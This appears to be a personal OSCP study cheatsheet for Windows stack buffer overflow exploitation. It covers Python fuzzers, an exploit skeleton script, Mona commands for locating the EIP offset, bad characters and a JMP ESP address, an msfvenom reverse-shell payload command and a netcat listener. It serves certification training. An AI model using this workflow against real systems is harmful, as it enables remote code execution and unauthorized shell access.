---
layout: post
title: Buffer Overflow personnal cheatsheet
tags: [OSCP, Buffer Overflow, Cheatsheet]
description: "Buffer Overflow personnal cheatsheet"

---

### Check for windows protections :

- C:\Users\thiba\Desktop\build\Release\winchecksec.exe PATH.exe

### Mona Configuration :

- mona config -set workingfolder c:\mona\%p

### Fuzzing :

- fuzzer.py / fuzzer2.py -> until app crash

```
#fuzzer.py

import socket, time, sys

ip = "IP"
port = PORT
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

```
#fuzzer2.py

import socket

target_ip = "IP"
target_port = PORT

payload = 1000 * "A"

try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip,target_port))
    s.send(payload)
    print "[+] " + str(len(payload)) + " Bytes Sent"
except:
    print "[-] Crashed"
```

- /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l SIZE -> SIZE higher than crash offset

### Crash Replication & Controlling EIP :

- modify payload variable by pattern (exploit.py) 

  ```
  #exploit.py
  
  import socket
  
  ip = "IP"
  port = PORT
  
  prefix = ""
  offset = 0
  overflow = "A" * offset
  retn = ""
  padding = ""
  payload = ""
  postfix = ""
  
  buffer = prefix + overflow + retn + padding + payload + postfix
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
  try:
      s.connect((ip, port))
      print("Sending evil buffer...")
      s.send(buffer + "\r\n")
      print("Done!")
  except:
      print("Could not connect.")
  ```

  

- !mona findmsp -distance SIZE -> SIZE same as pattern

- EIP contains normal pattern : ... (offset XXXX) -> get the offset, modify offset variable (exploit.py)

- modify retn variable by "BBBB", remove payload

- Re-run exploit.py -> EIP should be "BBBB"

### Finding Bad Characters :

- !mona bytearray -b "\x00" -> copy results to payload variable
- Re-run exploit.py
- !mona compare -f C:\mona\oscp\bytearray.bin -a ESP_ADDRESS -> copy bad chars
- !mona bytearray -b "\x00 + BAD_CHARS" -> copy results to payload variable
- !mona compare -f C:\mona\oscp\bytearray.bin -a ESP_ADDRESS -> Repeat the badchar comparison until the results status returns
- "Unmodified". This indicates that no more badchars exist.

### Finding a Jump Point :

- !mona jmp -r esp -cpb "BAD_CHARS" -> Choose an address and update exploit.py, setting the "retn" variable to the address, written backwards

or

- !mona modules
- !mona find -s "\xff\xe4" -m DLL

### Generate Payload :

- msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -b "BAD_CHARS" -f py -> Copy the generated shell code setting the payload variable

### Prepend NOPs :

- padding = "\x90" * 16

### Start nc listerner :

- nc -lvp 1234

